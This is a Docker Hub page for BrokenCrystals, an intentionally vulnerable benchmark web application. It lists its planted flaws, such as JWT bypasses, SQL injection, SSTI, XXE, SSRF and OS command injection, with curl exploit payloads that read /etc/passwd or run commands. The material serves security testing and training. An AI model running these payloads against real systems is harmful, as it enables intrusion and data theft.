@@ -1,0 +1,380 @@
+brightsec/brokencrystals - Docker Image
+
+Search Docker Hub
+K
+
+Help
+
+Back
+Documentation
+⁠Forums
+⁠Contact support
+System status
+⁠
+
+System theme
+
+Sign inSign up
+
+Back
+
+Back
+
+Help
+
+Back
+Documentation
+⁠Forums
+⁠Contact support
+System status
+⁠
+
+System theme
+
+Docker Suite
+
+Explore
+/
+brightsec
+/
+brokencrystals
+
+brightsec/brokencrystals
+
+By brightsec
+•Updated 7 days ago
+
+Image
+
+0
+10K+
+
+OverviewTags
+
+brightsec/brokencrystals repository overview
+⁠Description
+
+Broken Crystals is a benchmark application that uses modern technologies and implements a set of common security vulnerabilities.
+
+The application contains:
+
+React based web client & API: http://localhost:3000⁠
+
+Node.js server that serves the React client and provides both OpenAPI and GraphQL endpoints.
+The full API documentation is available via swagger or GraphQL:
+
+Swagger UI - http://localhost:3000/swagger⁠
+
+Swagger JSON file - http://localhost:3000/swagger-json⁠
+
+GraphiQL UI - http://localhost:3000/graphiql⁠
+
+Note
+The GraphQL API does not yet support all the endpoints the REST API does.
+
+⁠Building and Running the Application
+
+Build and start local development environment with Postgres DB, MailCatcher and the app:
+
+docker compose --file=compose.local.yml up -d
+
+Copy
+
+To rebuild the app and restart the containers:
+
+docker compose --file=compose.local.yml up -d --build --force-recreate
+
+Copy
+
+⁠Running tests by SecTester⁠
+
+In the path ./test⁠ you can find tests to run with Jest.
+
+First, you have to get a Bright API key⁠, navigate to your .env⁠ file, and paste your Bright API key as the value of the BRIGHT_TOKEN variable:
+
+BRIGHT_TOKEN=<your_API_key_here>
+
+Copy
+
+Then, you can modify a URL to your instance of the application by setting the SEC_TESTER_TARGET environment variable in your .env⁠ file:
+
+SEC_TESTER_TARGET=http://localhost:3000
+
+Copy
+
+Finally, you can start tests with SecTester against these endpoints as follows:
+
+npm run test:e2e
+
+Copy
+
+Full configuration & usage examples can be found in our demo project⁠;
+
+⁠Vulnerabilities Overview
+
+Broken JWT Authentication - The application includes multiple endpoints that generate and validate several types of JWT tokens. The main login API, used by the UI, is utilizing one of the endpoints while others are available via direct call and described in Swagger.
+
+No Algorithm bypass - Bypasses the JWT authentication by using the “None” algorithm (implemented in main login and API authorization code).
+
+RSA to HMAC - Changes the algorithm to use a “HMAC” variation and signs with the public key of the application to bypass the authentication (implemented in main login and API authorization code).
+
+Invalid Signature - Changes the signature of the JWT to something different and bypasses the authentication (implemented in main login and API authorization code).
+
+KID Manipulation - Changes the value of the KID field in the Header of JWT to use either: (1) a static file that the application uses or (2) OS Command that echoes the key that will be signed or (3) SQL code that will return a key that will be used to sign the JWT (implemented in designated endpoint as described in Swagger).
+
+Brute Forcing Weak Secret Key - Checks if common secret keys are used (implemented in designated endpoint as described in Swagger). The secret token is configurable via .env file and, by default, is 123.
+
+X5U Rogue Key - Uses the uploaded certificate to sign the JWT and sets the X5U Header in JWT to point to the uploaded certificate (implemented in designated endpoint as described in Swagger).
+
+X5C Rogue Key - The application doesn't properly check which X5C key is used for signing. When we set the X5C headers to our values and sign with our private key, authentication is bypassed (implemented in designated endpoint as described in Swagger).
+
+JKU Rogue Key - Uses our publicly available JSON to check if JWT is properly signed after we set the Header in JWT to point to our JSON and sign the JWT with our private key (implemented in designated endpoint as described in Swagger).
+
+JWK Rogue Key - We make a new JSON with empty values, hash it, and set it directly in the Header, and we then use our private key to sign the JWT (implemented in designated endpoint as described in Swagger).
+
+Brute Force Login - Checks if the application user is using a weak password. The default setup contains user = admin with password = admin
+
+Common Files - Tries to find common files that shouldn’t be publicly exposed (such as “phpinfo”, “.htaccess”, “ssh-key.priv”, etc…). The application contains .htaccess and nginx.conf files under the client's root directory and additional files can be added by placing them under the public/public directory and running a build of the client.
+
+Cookie Security - Checks if the cookie has the “secure” and HTTP only flags. The application returns two cookies (session and bc-calls-counter cookie), both without secure and HttpOnly flags.
+
+Cross-Site Request Forgery (CSRF)
+
+Checks if a form holds anti-CSRF tokens, misconfigured “CORS” and misconfigured “Origin” header - the application returns "Access-Control-Allow-Origin: *" header for all requests. The behavior can be configured in the /main.ts file.
+
+The same form with both authenticated and unauthenticated user - the Email subscription UI forms can be used for testing this vulnerability.
+
+Different form for an authenticated and unauthenticated user - the Add testimonial form can be used for testing. The forms are only available to authenticated users.
+
+Cross-Site Scripting (XSS) -
+
+Reflective XSS can be demonstrated by using the mailing list subscription form on the landing page.
+
+Persistent XSS can be demonstrated using add testimonial form on the landing page (for authenticated users only).
+
+Default Login Location - The login endpoint is available under /api/auth/login.
+
+Directory Listing - The Nginx config file under the nginx-conf directory is configured to allow directory listing.
+
+DOM Cross-Site Scripting - Open the landing page with the dummy query param that contains DOM content (including script), add the provided DOM into the page, and execute it.
+
+File Upload - The application allows uploading an avatar photo of the authenticated user. The server doesn't perform any sort of validation on the uploaded file.
+
+Example of No Anti-Virus Protection
+Uploading an EICAR test file with the file extension changed to "exe":
+
+curl -i 'https://qa.brokencrystals.com/api/users/one/admin/photo' \
+-X PUT \
+-H 'authorization: AUTH_TOKEN' \
+-H 'Content-Type: multipart/form-data; boundary=--------------------------296987379026085658617195' \
+--data-binary $'----------------------------296987379026085658617195\r\nContent-Disposition: form-data; name="admin"; filename="sample-img2ee0.exe"\r\nContent-Type: image/png\r\n\r\nX5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\r\n----------------------------296987379026085658617195--\r\n'
+
+Copy
+
+The response indicates successful upload:
+
+HTTP/2 200
+
+Copy
+
+Successfully fetching the file shows that the server stored the file:
+
+$ curl -i 'https://qa.brokencrystals.com/api/users/one/admin/photo' -H 'authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJleHAiOjE3NDI5NzkyOTJ9.NBfrHS7ydCltPBKDWuKbXvKJq901Q1cJHjyf3jhElJVAijuxNxOMCib-luiijXHHidIcgaHQrHF0ofcwBdaoZNfR244YEI0DalmruMd2xjumUJNy8jiofGgF0n-nwxp-CDdjN-xxV81oy7pscmHfYO07OyUWr1rqvPZYDejC1TGP8j1vlDeWkEB0gsE9NRb38DDwdkcjsy1UpLcidppVexUgCP60blghDTKYBEUFmfbFWNScN1BNSDvIhTIgXPX_GKuRueLayY15YtjCKRjqzjpTrTi80d5mf9nzoVIbo2RyjGRCg8LX7M1Zi7XRAhuZHV2JIMGqhXvWeFyN_BfQbxniZEcbP2SRUFhJChuZrf4JQeyhOQo_iPZb6xwJzHTY_Gd96jgGaMXgQLY933vI9s5Rc9TlpsVzPatESVK6ve1comR1k9xCeozEwpNY79kYjDIdFiUp8An0MSBYUbC-SvQWijB8wStogMyovWzJP83Lrpd77Oi5ZxK8onKBHMt8tKUkCZmFs8kAQLhkqq9QNiQVAhvnTJaIppy0kq0R-fBDeGWeMv3JLZbJUYea_mVmj3VhhlQ4PIJAhTTTTKTroKakfiCuDnzjIh3_voT2nrudCAP3tWsDgJRL6ViJNue4Xld2y2ASoMfgO52IAlr39Paxekq5nW-LHuZhsMxAMjY'
+HTTP/2 200
+date: Wed, 26 Mar 2025 08:18:40 GMT
+content-type: application/octet-stream
+content-length: 68
+x-xss-protection: 0
+strict-transport-security: max-age=31536000; includeSubDomains
+x-content-type-options: 1
+content-security-policy: default-src * 'unsafe-inline' 'unsafe-eval'
+set-cookie: bc-calls-counter=1742977120812
+set-cookie: connect.sid=lMiES0Dvw-Ry3lTj3y66OZz5E4yss82w.N8A90AIvE3tPkAoQfoah5KOb6PUIuw%2FqXA2Lf2HkCBU; Path=/
+
+X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+
+Copy
+
+Full Path Disclosure - All errors returned by the server include the full path of the file where the error has occurred. The errors can be triggered by passing wrong values as parameters or by modifying the bc-calls-counter cookie to a non-numeric value.
+
+Headers Security Check - The application is configured with misconfigured security headers. The list of headers is available in the headers.configurator.interceptor.ts file. A user can pass the no-sec-headers query param to any API to prevent the server from sending the headers.
+
+HTML Injection - Both forms testimonial and mailing list subscription forms allow HTML injection.
+
+CSS Injection - The login page is vulnerable to CSS Injections through a URL parameter: https://brokencrystals.com/userlogin?logobgcolor=transparent⁠.
+
+HTTP Method fuzzer - The server supports uploading, deletion, and getting the content of a file via /put.raw addition to the URL. The actual implementation using a regular upload endpoint of the server and the /put.raw endpoint is mapped in Nginx.
+
+LDAP Injection - The login request returns an LDAP query for the user's profile, which can be used as a query parameter in /api/users/ldap query query parameter. The returned query can be modified to search for other users. If the structure of the LDAP query is changed, a detailed LDAP error will be returned (with LDAP server information and hierarchy).
+
+Local File Inclusion (LFI) - The /api/files endpoint returns any file on the server from the path that is provided in the path param. The UI uses this endpoint to load crystal images on the landing page.
+
+Mass Assignment - You can add to user admin privileges upon creating user or updating userdata. When you are creating a new user /api/users/basic you can use additional hidden field in body request { ... "isAdmin" : true }. If you are trying to edit userdata with PUT request /api/users/one/{email}/info you can add this additional field mentioned above. For checking admin permissions there is one more endpoint: /api/users/one/{email}/adminpermission.
+
+Open Database - The index.html file includes a link to manifest URL, which returns the server's configuration, including a DB connection string.
+
+OS Command Injection - The /api/spawn endpoint spawns a new process using the command in the command query parameter. The endpoint is not referenced from UI.
+
+Example Exploitation
+To demonstrate an SSTI attack, you can use the following `curl` command:
+
+```bash
+$ curl 'https://brokencrystals.com/api/spawn?command=uname%20-a'
+```
+
+The response includes a result of code execution:
+
+```
+Linux brokencrystals-5b9b6759cb-66vvt 6.1.115-126.197.amzn2023.x86_64 #1 SMP PREEMPT_DYNAMIC Tue Nov 5 17:36:57 UTC 2024 x86_64 Linux
+```
+
+Copy
+
+Another Example Exploitation on graphQL
+To demonstrate another SSTI attack, you can use the following `curl` command:
+
+```bash
+curl -i -X POST -H Content-Type:application/json -H Accept:application/json 'https://brokencrystals.com/graphql' -d '{"query":"query ($getCommandResult_command: String!) { getCommandResult (command: $getCommandResult_command) }" ,"variables":{"getCommandResult_command":"/bin/cat /etc/passwd "}}'
+```
+
+The response includes a result of code execution:
+
+```
+{"data":{"getCommandResult":"root:x:0:0:root:/root:/bin/sh\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/mail:/sbin/nologin\nnews:x:9:13:news:/usr/lib/news:/sbin/nologin\nuucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin\ncron:x:16:16:cron:/var/spool/cron:/sbin/nologin\nftp:x:21:21::/var/lib/ftp:/sbin/nologin\nsshd:x:22:22:sshd:/dev/null:/sbin/nologin\ngames:x:35:35:games:/usr/games:/sbin/nologin\nntp:x:123:123:NTP:/var/empty:/sbin/nologin\nguest:x:405:100:guest:/dev/null:/sbin/nologin\nnobody:x:65534:65534:nobody:/:/sbin/nologin\nnode:x:1000:1000::/home/node:/bin/sh\n"}}%
+```
+
+Copy
+
+```
+
+Secret Tokens - The index.html file includes a link to manifest URL, which returns the server's configuration, including a Google API key.
+
+Server-Side Template Injection (SSTI) - The endpoint /api/render receives a plain text body and renders it using the doT (http://github.com/olado/dot⁠) templating engine.
+
+Server-Side Template Injection (SSTI) Example Exploitation
+To demonstrate an SSTI attack, you can use the following curl command:
+
+curl 'https://brokencrystals.com/api/render' -X POST -H 'Content-Type: text/plain' \
+--data-raw "{{= global.process.mainModule.require('child_process').execSync('ls -la /home') }}"
+
+Copy
+
+The response includes a result of code execution - lising /home dir
+
+total 0
+drwxr-xr-x 1 root root 18 Feb 20 15:27 .
+drwxr-xr-x 1 root root 40 Mar 21 11:57 ..
+drwxr-sr-x 2 node node 6 Feb 20 15:27 node
+
+Copy
+
+Server-Side Request Forgery (SSRF) - The endpoint /api/file receives the path and type query parameters and returns the content of the file in path with Content-Type value from the type parameter. The endpoint supports relative and absolute file names, HTTP/S requests, as well as metadata URLs of Azure, Google Cloud, AWS, and DigitalOcean.
+There are specific endpoints for each cloud provider as well - /api/file/google, /api/file/aws, /api/file/azure, /api/file/digital_ocean.
+
+SQL injection (SQLi) - The /api/testimonials/count endpoint receives and executes SQL query in the query parameter. Similarly, the /api/products/views endpoint utilizes the x-product-name header to update the number of views for a product. However, both of these parameters can be exploited to inject SQL code, making these endpoints vulnerable to SQL injection attacks.
+
+SQL Injection Example Exploitation
+To demonstrate an SQL injection attack, you can use the following curl commands:
+
+$ curl -o /dev/null -s -w "Total time: %{time_total} seconds\n" "https://brokencrystals.com/api/testimonials/count?query=%3BSELECT%20PG_SLEEP(5)--"
+Total time: 5.687800 seconds
+
+Copy
+
+This command injects a SQL query that causes the database to sleep for 5 seconds. The total time taken for the request indicates that the SQL injection was successful.
+
+$ curl -o /dev/null -s -w "Total time: %{time_total} seconds\n" "https://brokencrystals.com/api/testimonials/count?query=%3BSELECT%20PG_SLEEP(1)--"
+Total time: 1.691999 seconds
+
+Copy
+
+Similar to the previous command, this one causes the database to sleep for 1 second, demonstrating the ability to manipulate the database's behavior through SQL injection.
+
+$ curl https://brokencrystals.com/api/testimonials/count?query=select%20count%28table_name%29%20as%20count%20from%20information_schema.tables
+214
+
+Copy
+
+This command retrieves the count of tables in the database's information schema, showing that the injected SQL query can access and extract data from the database.
+
+</details>
+
+Copy
+
+Unvalidated Redirect - The endpoint /api/goto redirects the client to the URL provided in the url query parameter. The UI references the endpoint in the header (while clicking on the site's logo) and as a href source for the Terms and Services link in the footer.
+
+Unvalidated Redirect Example Exploitation
+To demonstrate an unvalidated redirect attack, you can use the following curl command:
+
+$ curl -I "https://qa.brokencrystals.com/api/goto?url=https://example.com"
+HTTP/1.1 302 Found
+Location: https://malicious-site.com
+
+Copy
+
+Version Control System - The client_s build process copies SVN, GIT, and Mercurial source control directories to the client application root, and they are accessible under Nginx root.
+
+XML External Entity (XXE) - The endpoint, POST /api/metadata, receives URL-encoded XML data in the xml query parameter, processes it with enabled external entities (using libxmljs library) and returns the serialized DOM. Additionally, for a request that tries to load file:///etc/passwd as an entity, the endpoint returns a mocked up content of the file.
+
+XXE Example Exploitation
+Additionally, the endpoint PUT /api/users/one/{email}/photo accepts SVG images, which are processed with libxml library and stored on the server, as well as sent back to the client.
+
+To demonstrate an XXE attack, you can use the following curl command:
+
+curl 'https://brokencrystals.com/api/metadata' -X POST -H 'Content-Type: text/xml' \
+--data-raw '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE replace [<!ENTITY nexploit_xxe SYSTEM "file://etc/passwd">]> <root> &nexploit_xxe; </root>'
+
+Copy
+
+The response containse servers file://etc/passwd content
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE replace [
+<!ENTITY nexploit_xxe SYSTEM "file://etc/passwd">
+]>
+<root> root:x:0:0:root:/root:/bin/sh
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/mail:/sbin/nologin
+news:x:9:13:news:/usr/lib/news:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
+cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
+ftp:x:21:21::/var/lib/ftp:/sbin/nologin
+sshd:x:22:22:sshd:/dev/null:/sbin/nologin
+games:x:35:35:games:/usr/games:/sbin/nologin
+ntp:x:123:123:NTP:/var/empty:/sbin/nologin
+guest:x:405:100:guest:/dev/null:/sbin/nologin
+nobody:x:65534:65534:nobody:/:/sbin/nologin
+node:x:1000:1000::/home/node:/bin/sh
+</root>
+
+Copy
+
+JavaScript Vulnerabilities Scanning - Index.html includes an older version of the jQuery library with known vulnerabilities.
+
+AO1 Vertical access controls - The page /dashboard can be reached despite the rights of user.
+
+Broken Function Level Authorization - The endpoint DELETE /users/one/:id/photo?isAdmin= can be used to delete any user's profile photo by enumerating the user IDs and setting the isAdmin query parameter to true, as there is no validation of it's value on the server side.
+
+IFrame Injection - The /testimonials page a URL parameter videosrc which directly controls the src attribute of the IFrame at the bottom of this page. Similarly, the home page takes a URL param maptitle which directly controls the title attribute of the IFrame at the CONTACT section of this page.
+
+Excessive Data Exposure - The /api/users/one/:email is supposed to expose only basic user information required to be displayed on the UI, but it also returns the user's phone number which is unnecessary information.
+
+Business Constraint Bypass - The /api/products/latest endpoint supports a limit parameter, which by default is set to 3. The /api/products endpoint is a password protected endpoint which returns all the products, yet if you change the limit param of /api/products/latest to be high enough you could get the same results without the need to be authenticated.
+
+ID Enumeration - There are a few ID Enumeration vulnerabilities:
+
+The endpoint DELETE /users/one/:id/photo?isAdmin= which is used to delete a user's profile picture is vulnerable to ID Enumeration together with Broken Function Level Authorization⁠.
+
+The /users/id/:id endpoint returns user info by ID, it doesn't require neither authentication nor authorization.
+
+XPATH Injection - The /api/partners/* endpoint contains the following XPATH injection vulnerabilities:
+
+The endpoint GET /api/partners/partnerLogin is supposed to log in with the user's credentials in order to obtain account info. It's vulnerable to an XPATH injection using boolean based payloads. When exploited it'll retrieve data about other users as well. You can use ' or '1'='1 in the password field to exploit the EP.
+
+The endpoint GET /api/partners/searchP
+... [truncated at 20 000 chars]
